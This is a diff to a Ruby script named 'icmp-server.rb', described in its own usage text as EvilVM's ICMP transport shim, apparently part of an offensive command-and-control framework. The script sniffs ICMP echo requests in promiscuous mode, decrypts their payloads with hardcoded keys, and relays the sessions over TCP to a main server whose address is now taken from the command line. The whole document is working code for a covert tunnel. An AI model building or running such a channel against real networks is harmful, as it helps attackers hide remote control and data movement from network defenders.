@@ -11,7 +11,6 @@ require 'pp'
 require 'socket'
 require 'time'
 
-$server = "10.0.2.11"
 $inkey = "\xf1\x77\x80\x02\xea\x2a\x5f\x72\xd2\x0b\x28\x1e\x38\xa9\xc9\x4b"
 $outkey = "\x1c\xab\x2b\x1d\xa7\xf8\xd7\x98\x4a\x28\x8b\x54\x58\x71\xb0\x52"
 
@@ -24,7 +23,7 @@ end
 class Session
   attr_accessor :sessid
   
-  def initialize(known_ids, interface)
+  def initialize(known_ids, interface, server, port)
     @lastseq = -1
     @interface = interface
     @sessid = gen_id(known_ids)
@@ -36,7 +35,7 @@ class Session
     @incrypto.key_setup($inkey)
     @outcrypto.key_setup($outkey)
 
-    @console = TCPSocket.new($server, 1919)
+    @console = TCPSocket.new(server, port)
 
     @mutex = Mutex.new()
     @queue = ""
@@ -148,6 +147,16 @@ Thread.new do
   end
 end
 
+if ARGV.length != 2
+  pputs("")
+  pputs(" usage: icmp-server.rb <svr-ip> <svr-port>", 33)
+  pputs("")
+  pputs("    <svr-ip>   IP for main EvilVM server", 33)
+  pputs("    <svr-port> Port for main EvilVM server", 33)
+  pputs("")
+  exit(1)
+end
+
 pputs("Starting EvilVM's ICMP transport shim")
 
 if Process.uid != 0
@@ -170,19 +179,22 @@ begin
   conns = {}
   interface = PacketFu::Utils.default_int
   myip = PacketFu::Utils.default_ip
+  server = ARGV[0]
+  port = ARGV[1].to_i
 
-  pputs("Using interface #{interface}")
+  pputs("Using interface #{interface}, IP #{myip}")
+  pputs("Connecting to server at #{server}:#{port}")
   capture = PacketFu::Capture.new(:iface => interface, :promisc => true, :filter => "icmp")
   count = 0
   
   capture.stream.each do |packet|
     packet = PacketFu::ICMPPacket.parse(packet)
-    if packet.icmp_type == 8 and packet.ip_daddr == $server
+    if packet.icmp_type == 8 and packet.ip_daddr == myip
       count += 1
       print("\x1b]0;#{count} packets\x07")
       (icmpid, icmpseq, sessid) = packet.payload.unpack("nnI")
       if sessid == 0
-        session = Session.new(conns.keys, interface)
+        session = Session.new(conns.keys, interface, server, port)
         conns[session.sessid] = session
         session.deliver(packet, [icmpid, icmpseq, session.sessid, 0, 0].pack("nnIII"))
       else
